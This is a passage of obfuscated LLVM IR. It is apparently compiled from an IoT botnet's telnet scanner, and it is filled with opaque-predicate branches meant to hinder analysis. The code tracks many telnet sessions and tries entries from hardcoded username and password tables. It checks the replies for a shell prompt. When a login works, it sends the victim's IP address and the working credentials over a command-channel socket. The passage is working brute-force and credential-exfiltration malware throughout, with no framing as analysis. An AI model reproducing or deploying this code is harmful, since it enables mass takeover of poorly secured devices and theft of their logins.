  %1353 = or i1 %1351, %1352
  br i1 %1353, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1345
  %1354 = load i32, i32* %4, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 2
  store i8 7, i8* %1357, align 8
  %1358 = load i32, i32* @x.63
  %1359 = load i32, i32* @y.64
  %1360 = sub i32 %1358, 1
  %1361 = mul i32 %1358, %1360
  %1362 = urem i32 %1361, 2
  %1363 = icmp eq i32 %1362, 0
  %1364 = icmp slt i32 %1359, 10
  %1365 = or i1 %1363, %1364
  br i1 %1365, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %1366

; <label>:1366:                                   ; preds = %originalBBpart2148
  %1367 = load i32, i32* %4, align 4
  %1368 = sext i32 %1367 to i64
  %1369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1368
  %1370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1369, i32 0, i32 8
  %1371 = load i8*, i8** %1370, align 8
  call void @llvm.memset.p0i8.i64(i8* %1371, i8 0, i64 1024, i32 1, i1 false)
  br label %1844

; <label>:1372:                                   ; preds = %1230
  %1373 = load i32, i32* @x.63
  %1374 = load i32, i32* @y.64
  %1375 = sub i32 %1373, 1
  %1376 = mul i32 %1373, %1375
  %1377 = urem i32 %1376, 2
  %1378 = icmp eq i32 %1377, 0
  %1379 = icmp slt i32 %1374, 10
  %1380 = or i1 %1378, %1379
  br i1 %1380, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1372
  %1381 = load i32, i32* %4, align 4
  %1382 = sext i32 %1381 to i64
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1382
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1383, i32 0, i32 8
  %1385 = load i8*, i8** %1384, align 8
  %1386 = call i64 @strlen(i8* %1385) #10
  %1387 = trunc i64 %1386 to i16
  %1388 = load i32, i32* %4, align 4
  %1389 = sext i32 %1388 to i64
  %1390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1389
  %1391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1390, i32 0, i32 7
  store i16 %1387, i16* %1391, align 16
  %1392 = load i32, i32* @x.63
  %1393 = load i32, i32* @y.64
  %1394 = sub i32 %1392, 1
  %1395 = mul i32 %1392, %1394
  %1396 = urem i32 %1395, 2
  %1397 = icmp eq i32 %1396, 0
  %1398 = icmp slt i32 %1393, 10
  %1399 = or i1 %1397, %1398
  br i1 %1399, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %1400

; <label>:1400:                                   ; preds = %originalBBpart2152
  %1401 = load i32, i32* %4, align 4
  %1402 = sext i32 %1401 to i64
  %1403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1402
  %1404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1403, i32 0, i32 6
  %1405 = load i32, i32* %1404, align 4
  %1406 = add i32 %1405, 30
  %1407 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1408 = icmp ult i32 %1406, %1407
  br i1 %1408, label %1409, label %1424

; <label>:1409:                                   ; preds = %1400
  %1410 = load i32, i32* %4, align 4
  %1411 = sext i32 %1410 to i64
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1411
  %1413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1412, i32 0, i32 0
  %1414 = load i32, i32* %1413, align 16
  %1415 = call i32 @sclose(i32 %1414)
  %1416 = load i32, i32* %4, align 4
  %1417 = sext i32 %1416 to i64
  %1418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1417
  %1419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1418, i32 0, i32 2
  store i8 0, i8* %1419, align 8
  %1420 = load i32, i32* %4, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1421
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1422, i32 0, i32 3
  store i8 1, i8* %1423, align 1
  br label %1424

; <label>:1424:                                   ; preds = %1409, %1400
  br label %1843

; <label>:1425:                                   ; preds = %originalBBpart219
  %1426 = load i32, i32* %4, align 4
  %1427 = sext i32 %1426 to i64
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1427
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1428, i32 0, i32 0
  %1430 = load i32, i32* %1429, align 16
  %1431 = call i64 @send(i32 %1430, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i32 0, i32 0), i64 4, i32 16384)
  %1432 = icmp slt i64 %1431, 0
  br i1 %1432, label %1433, label %1448

; <label>:1433:                                   ; preds = %1425
  %1434 = load i32, i32* %4, align 4
  %1435 = sext i32 %1434 to i64
  %1436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1435
  %1437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1436, i32 0, i32 0
  %1438 = load i32, i32* %1437, align 16
  %1439 = call i32 @sclose(i32 %1438)
  %1440 = load i32, i32* %4, align 4
  %1441 = sext i32 %1440 to i64
  %1442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1441
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1442, i32 0, i32 2
  store i8 0, i8* %1443, align 8
  %1444 = load i32, i32* %4, align 4
  %1445 = sext i32 %1444 to i64
  %1446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1445
  %1447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1446, i32 0, i32 3
  store i8 1, i8* %1447, align 1
  br label %1844

; <label>:1448:                                   ; preds = %1425
  %1449 = load i32, i32* %4, align 4
  %1450 = sext i32 %1449 to i64
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1450
  %1452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1451, i32 0, i32 2
  store i8 8, i8* %1452, align 8
  br label %1843

; <label>:1453:                                   ; preds = %originalBBpart219
  %1454 = load i32, i32* %4, align 4
  %1455 = sext i32 %1454 to i64
  %1456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1455
  %1457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1456, i32 0, i32 0
  %1458 = load i32, i32* %1457, align 16
  %1459 = call i64 @send(i32 %1458, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.30, i32 0, i32 0), i64 7, i32 16384)
  %1460 = icmp slt i64 %1459, 0
  br i1 %1460, label %1461, label %1476

; <label>:1461:                                   ; preds = %1453
  %1462 = load i32, i32* %4, align 4
  %1463 = sext i32 %1462 to i64
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1463
  %1465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1464, i32 0, i32 0
  %1466 = load i32, i32* %1465, align 16
  %1467 = call i32 @sclose(i32 %1466)
  %1468 = load i32, i32* %4, align 4
  %1469 = sext i32 %1468 to i64
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1469
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1470, i32 0, i32 2
  store i8 0, i8* %1471, align 8
  %1472 = load i32, i32* %4, align 4
  %1473 = sext i32 %1472 to i64
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1473
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1474, i32 0, i32 3
  store i8 1, i8* %1475, align 1
  br label %1844

; <label>:1476:                                   ; preds = %1453
  %1477 = load i32, i32* @x.63
  %1478 = load i32, i32* @y.64
  %1479 = sub i32 %1477, 1
  %1480 = mul i32 %1477, %1479
  %1481 = urem i32 %1480, 2
  %1482 = icmp eq i32 %1481, 0
  %1483 = icmp slt i32 %1478, 10
  %1484 = or i1 %1482, %1483
  br i1 %1484, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1476
  %1485 = load i32, i32* %4, align 4
  %1486 = sext i32 %1485 to i64
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1486
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1487, i32 0, i32 2
  store i8 9, i8* %1488, align 8
  %1489 = load i32, i32* @x.63
  %1490 = load i32, i32* @y.64
  %1491 = sub i32 %1489, 1
  %1492 = mul i32 %1489, %1491
  %1493 = urem i32 %1492, 2
  %1494 = icmp eq i32 %1493, 0
  %1495 = icmp slt i32 %1490, 10
  %1496 = or i1 %1494, %1495
  br i1 %1496, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %1843

; <label>:1497:                                   ; preds = %originalBBpart219
  %1498 = load i32, i32* %4, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1499
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1500, i32 0, i32 0
  %1502 = load i32, i32* %1501, align 16
  %1503 = call i64 @send(i32 %1502, i8* getelementptr inbounds ([181 x i8], [181 x i8]* @.str.31, i32 0, i32 0), i64 207, i32 16384)
  %1504 = icmp slt i64 %1503, 0
  br i1 %1504, label %1505, label %1536

; <label>:1505:                                   ; preds = %1497
  %1506 = load i32, i32* @x.63
  %1507 = load i32, i32* @y.64
  %1508 = sub i32 %1506, 1
  %1509 = mul i32 %1506, %1508
  %1510 = urem i32 %1509, 2
  %1511 = icmp eq i32 %1510, 0
  %1512 = icmp slt i32 %1507, 10
  %1513 = or i1 %1511, %1512
  br i1 %1513, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1505
  %1514 = load i32, i32* %4, align 4
  %1515 = sext i32 %1514 to i64
  %1516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1515
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1516, i32 0, i32 0
  %1518 = load i32, i32* %1517, align 16
  %1519 = call i32 @sclose(i32 %1518)
  %1520 = load i32, i32* %4, align 4
  %1521 = sext i32 %1520 to i64
  %1522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1521
  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1522, i32 0, i32 2
  store i8 0, i8* %1523, align 8
  %1524 = load i32, i32* %4, align 4
  %1525 = sext i32 %1524 to i64
  %1526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1525
  %1527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1526, i32 0, i32 3
  store i8 1, i8* %1527, align 1
  %1528 = load i32, i32* @x.63
  %1529 = load i32, i32* @y.64
  %1530 = sub i32 %1528, 1
  %1531 = mul i32 %1528, %1530
  %1532 = urem i32 %1531, 2
  %1533 = icmp eq i32 %1532, 0
  %1534 = icmp slt i32 %1529, 10
  %1535 = or i1 %1533, %1534
  br i1 %1535, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %1844

; <label>:1536:                                   ; preds = %1497
  %1537 = load i32, i32* @x.63
  %1538 = load i32, i32* @y.64
  %1539 = sub i32 %1537, 1
  %1540 = mul i32 %1537, %1539
  %1541 = urem i32 %1540, 2
  %1542 = icmp eq i32 %1541, 0
  %1543 = icmp slt i32 %1538, 10
  %1544 = or i1 %1542, %1543
  br i1 %1544, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1536
  %1545 = load i32, i32* %4, align 4
  %1546 = sext i32 %1545 to i64
  %1547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1546
  %1548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1547, i32 0, i32 2
  store i8 10, i8* %1548, align 8
  %1549 = load i32, i32* @x.63
  %1550 = load i32, i32* @y.64
  %1551 = sub i32 %1549, 1
  %1552 = mul i32 %1549, %1551
  %1553 = urem i32 %1552, 2
  %1554 = icmp eq i32 %1553, 0
  %1555 = icmp slt i32 %1550, 10
  %1556 = or i1 %1554, %1555
  br i1 %1556, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %1843

; <label>:1557:                                   ; preds = %originalBBpart219
  %1558 = load i32, i32* %4, align 4
  %1559 = sext i32 %1558 to i64
  %1560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1559
  %1561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1560, i32 0, i32 0
  %1562 = load i32, i32* %1561, align 16
  %1563 = call i64 @send(i32 %1562, i8* getelementptr inbounds ([181 x i8], [181 x i8]* @.str.31, i32 0, i32 0), i64 207, i32 16384)
  %1564 = icmp slt i64 %1563, 0
  br i1 %1564, label %1565, label %1596

; <label>:1565:                                   ; preds = %1557
  %1566 = load i32, i32* @x.63
  %1567 = load i32, i32* @y.64
  %1568 = sub i32 %1566, 1
  %1569 = mul i32 %1566, %1568
  %1570 = urem i32 %1569, 2
  %1571 = icmp eq i32 %1570, 0
  %1572 = icmp slt i32 %1567, 10
  %1573 = or i1 %1571, %1572
  br i1 %1573, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1565
  %1574 = load i32, i32* %4, align 4
  %1575 = sext i32 %1574 to i64
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1575
  %1577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1576, i32 0, i32 0
  %1578 = load i32, i32* %1577, align 16
  %1579 = call i32 @sclose(i32 %1578)
  %1580 = load i32, i32* %4, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1581
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1582, i32 0, i32 2
  store i8 0, i8* %1583, align 8
  %1584 = load i32, i32* %4, align 4
  %1585 = sext i32 %1584 to i64
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1585
  %1587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1586, i32 0, i32 3
  store i8 1, i8* %1587, align 1
  %1588 = load i32, i32* @x.63
  %1589 = load i32, i32* @y.64
  %1590 = sub i32 %1588, 1
  %1591 = mul i32 %1588, %1590
  %1592 = urem i32 %1591, 2
  %1593 = icmp eq i32 %1592, 0
  %1594 = icmp slt i32 %1589, 10
  %1595 = or i1 %1593, %1594
  br i1 %1595, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br label %1844

; <label>:1596:                                   ; preds = %1557
  %1597 = load i32, i32* %4, align 4
  %1598 = sext i32 %1597 to i64
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1598
  %1600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1599, i32 0, i32 2
  store i8 11, i8* %1600, align 8
  br label %1843

; <label>:1601:                                   ; preds = %originalBBpart219
  %1602 = load i32, i32* %4, align 4
  %1603 = sext i32 %1602 to i64
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1603
  %1605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1604, i32 0, i32 6
  %1606 = load i32, i32* %1605, align 4
  %1607 = icmp eq i32 %1606, 0
  br i1 %1607, label %1608, label %1614

; <label>:1608:                                   ; preds = %1601
  %1609 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1610 = load i32, i32* %4, align 4
  %1611 = sext i32 %1610 to i64
  %1612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1611
  %1613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1612, i32 0, i32 6
  store i32 %1609, i32* %1613, align 4
  br label %1614

; <label>:1614:                                   ; preds = %1608, %1601
  %1615 = load i32, i32* %4, align 4
  %1616 = sext i32 %1615 to i64
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1616
  %1618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1617, i32 0, i32 0
  %1619 = load i32, i32* %1618, align 16
  %1620 = load i32, i32* %4, align 4
  %1621 = sext i32 %1620 to i64
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1621
  %1623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1622, i32 0, i32 8
  %1624 = load i8*, i8** %1623, align 8
  %1625 = load i32, i32* %4, align 4
  %1626 = sext i32 %1625 to i64
  %1627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1626
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1627, i32 0, i32 7
  %1629 = load i16, i16* %1628, align 16
  %1630 = zext i16 %1629 to i32
  %1631 = call i32 @readUntil(i32 %1619, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.32, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1624, i32 1024, i32 %1630)
  %1632 = icmp ne i32 %1631, 0
  br i1 %1632, label %1633, label %1684

; <label>:1633:                                   ; preds = %1614
  %1634 = load i32, i32* @x.63
  %1635 = load i32, i32* @y.64
  %1636 = sub i32 %1634, 1
  %1637 = mul i32 %1634, %1636
  %1638 = urem i32 %1637, 2
  %1639 = icmp eq i32 %1638, 0
  %1640 = icmp slt i32 %1635, 10
  %1641 = or i1 %1639, %1640
  br i1 %1641, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1633
  %1642 = load i32, i32* %4, align 4
  %1643 = sext i32 %1642 to i64
  %1644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1643
  %1645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1644, i32 0, i32 6
  store i32 0, i32* %1645, align 4
  %1646 = load i32, i32* %4, align 4
  %1647 = sext i32 %1646 to i64
  %1648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1647
  %1649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1648, i32 0, i32 7
  store i16 0, i16* %1649, align 16
  %1650 = load i32, i32* @mainCommSock, align 4
  %1651 = load i32, i32* %4, align 4
  %1652 = sext i32 %1651 to i64
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1652
  %1654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1653, i32 0, i32 1
  %1655 = bitcast i32* %1654 to %struct.in_addr*
  %1656 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1655, i32 0, i32 0
  %1657 = load i32, i32* %1656, align 4
  %1658 = call i8* @inet_ntoa(i32 %1657) #2
  %1659 = load i32, i32* %4, align 4
  %1660 = sext i32 %1659 to i64
  %1661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1660
  %1662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1661, i32 0, i32 4
  %1663 = load i8, i8* %1662, align 2
  %1664 = zext i8 %1663 to i64
  %1665 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %1664
  %1666 = load i8*, i8** %1665, align 8
  %1667 = load i32, i32* %4, align 4
  %1668 = sext i32 %1667 to i64
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1668
  %1670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1669, i32 0, i32 5
  %1671 = load i8, i8* %1670, align 1
  %1672 = zext i8 %1671 to i64
  %1673 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1672
  %1674 = load i8*, i8** %1673, align 8
  %1675 = call i32 (i32, i8*, ...) @sockprintf(i32 %1650, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i32 0, i32 0), i8* %1658, i8* %1666, i8* %1674)
  %1676 = load i32, i32* @x.63
  %1677 = load i32, i32* @y.64
  %1678 = sub i32 %1676, 1
  %1679 = mul i32 %1676, %1678
  %1680 = urem i32 %1679, 2
  %1681 = icmp eq i32 %1680, 0
  %1682 = icmp slt i32 %1677, 10
  %1683 = or i1 %1681, %1682
  br i1 %1683, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %1844

; <label>:1684:                                   ; preds = %1614
  %1685 = load i32, i32* %4, align 4
  %1686 = sext i32 %1685 to i64
  %1687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1686
  %1688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1687, i32 0, i32 0
  %1689 = load i32, i32* %1688, align 16
  %1690 = load i32, i32* %4, align 4
  %1691 = sext i32 %1690 to i64
  %1692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1691
  %1693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1692, i32 0, i32 8
  %1694 = load i8*, i8** %1693, align 8
  %1695 = load i32, i32* %4, align 4
  %1696 = sext i32 %1695 to i64
  %1697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1696
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1697, i32 0, i32 7
  %1699 = load i16, i16* %1698, align 16
  %1700 = zext i16 %1699 to i32
  %1701 = call i32 @readUntil(i32 %1689, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %1694, i32 1024, i32 %1700)
  %1702 = icmp ne i32 %1701, 0
  br i1 %1702, label %1703, label %1757

; <label>:1703:                                   ; preds = %1684
  %1704 = load i32, i32* %4, align 4
  %1705 = sext i32 %1704 to i64
  %1706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1705
  %1707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1706, i32 0, i32 6
  store i32 0, i32* %1707, align 4
  %1708 = load i32, i32* %4, align 4
  %1709 = sext i32 %1708 to i64
  %1710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1709
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1710, i32 0, i32 7
  store i16 0, i16* %1711, align 16
  %1712 = load i32, i32* @mainCommSock, align 4
  %1713 = load i32, i32* %4, align 4
  %1714 = sext i32 %1713 to i64
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1714
  %1716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1715, i32 0, i32 1
  %1717 = bitcast i32* %1716 to %struct.in_addr*
  %1718 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1717, i32 0, i32 0
  %1719 = load i32, i32* %1718, align 4
  %1720 = call i8* @inet_ntoa(i32 %1719) #2
  %1721 = load i32, i32* %4, align 4
  %1722 = sext i32 %1721 to i64
  %1723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1722
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1723, i32 0, i32 4
  %1725 = load i8, i8* %1724, align 2
  %1726 = zext i8 %1725 to i64
  %1727 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %1726
  %1728 = load i8*, i8** %1727, align 8
  %1729 = load i32, i32* %4, align 4
  %1730 = sext i32 %1729 to i64
  %1731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1730
  %1732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1731, i32 0, i32 5
  %1733 = load i8, i8* %1732, align 1
  %1734 = zext i8 %1733 to i64
  %1735 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1734
  %1736 = load i8*, i8** %1735, align 8
  %1737 = call i32 (i32, i8*, ...) @sockprintf(i32 %1712, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i32 0, i32 0), i8* %1720, i8* %1728, i8* %1736)
  %1738 = load i32, i32* %4, align 4
  %1739 = sext i32 %1738 to i64
  %1740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1739
  %1741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1740, i32 0, i32 8
  %1742 = load i8*, i8** %1741, align 8
  call void @llvm.memset.p0i8.i64(i8* %1742, i8 0, i64 1024, i32 1, i1 false)
  %1743 = load i32, i32* %4, align 4
  %1744 = sext i32 %1743 to i64
  %1745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1744
  %1746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1745, i32 0, i32 0
  %1747 = load i32, i32* %1746, align 16
  %1748 = call i32 @sclose(i32 %1747)
  %1749 = load i32, i32* %4, align 4
  %1750 = sext i32 %1749 to i64
  %1751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1750
  %1752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1751, i32 0, i32 3
  store i8 1, i8* %1752, align 1
  %1753 = load i32, i32* %4, align 4
  %1754 = sext i32 %1753 to i64
  %1755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1754
  %1756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1755, i32 0, i32 2
  store i8 0, i8* %1756, align 8
  br label %1844

; <label>:1757:                                   ; preds = %1684
  %1758 = load i32, i32* @x.63
  %1759 = load i32, i32* @y.64
  %1760 = sub i32 %1758, 1
  %1761 = mul i32 %1758, %1760
  %1762 = urem i32 %1761, 2
  %1763 = icmp eq i32 %1762, 0
  %1764 = icmp slt i32 %1759, 10
  %1765 = or i1 %1763, %1764
  br i1 %1765, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1757
  %1766 = load i32, i32* %4, align 4
  %1767 = sext i32 %1766 to i64
  %1768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1767
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1768, i32 0, i32 8
  %1770 = load i8*, i8** %1769, align 8
  %1771 = call i64 @strlen(i8* %1770) #10
  %1772 = trunc i64 %1771 to i16
  %1773 = load i32, i32* %4, align 4
  %1774 = sext i32 %1773 to i64
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1774
  %1776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1775, i32 0, i32 7
  store i16 %1772, i16* %1776, align 16
  %1777 = load i32, i32* @x.63
  %1778 = load i32, i32* @y.64
  %1779 = sub i32 %1777, 1
  %1780 = mul i32 %1777, %1779
  %1781 = urem i32 %1780, 2
  %1782 = icmp eq i32 %1781, 0
  %1783 = icmp slt i32 %1778, 10
  %1784 = or i1 %1782, %1783
  br i1 %1784, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br label %1785

; <label>:1785:                                   ; preds = %originalBBpart2176
  %1786 = load i32, i32* @x.63
  %1787 = load i32, i32* @y.64
  %1788 = sub i32 %1786, 1
  %1789 = mul i32 %1786, %1788
  %1790 = urem i32 %1789, 2
  %1791 = icmp eq i32 %1790, 0
  %1792 = icmp slt i32 %1787, 10
  %1793 = or i1 %1791, %1792
  br i1 %1793, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1785
  %1794 = load i32, i32* @x.63
  %1795 = load i32, i32* @y.64
  %1796 = sub i32 %1794, 1
  %1797 = mul i32 %1794, %1796
  %1798 = urem i32 %1797, 2
  %1799 = icmp eq i32 %1798, 0
  %1800 = icmp slt i32 %1795, 10
  %1801 = or i1 %1799, %1800
  br i1 %1801, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %1802

; <label>:1802:                                   ; preds = %originalBBpart2180
  %1803 = load i32, i32* %4, align 4
  %1804 = sext i32 %1803 to i64
  %1805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1804
  %1806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1805, i32 0, i32 6
  %1807 = load i32, i32* %1806, align 4
  %1808 = add i32 %1807, 30
  %1809 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1810 = icmp ult i32 %1808, %1809
  br i1 %1810, label %1811, label %1842

; <label>:1811:                                   ; preds = %1802
  %1812 = load i32, i32* @x.63
  %1813 = load i32, i32* @y.64
  %1814 = sub i32 %1812, 1
  %1815 = mul i32 %1812, %1814
  %1816 = urem i32 %1815, 2
  %1817 = icmp eq i32 %1816, 0
  %1818 = icmp slt i32 %1813, 10
  %1819 = or i1 %1817, %1818
  br i1 %1819, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1811
  %1820 = load i32, i32* %4, align 4
  %1821 = sext i32 %1820 to i64
  %1822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %1821
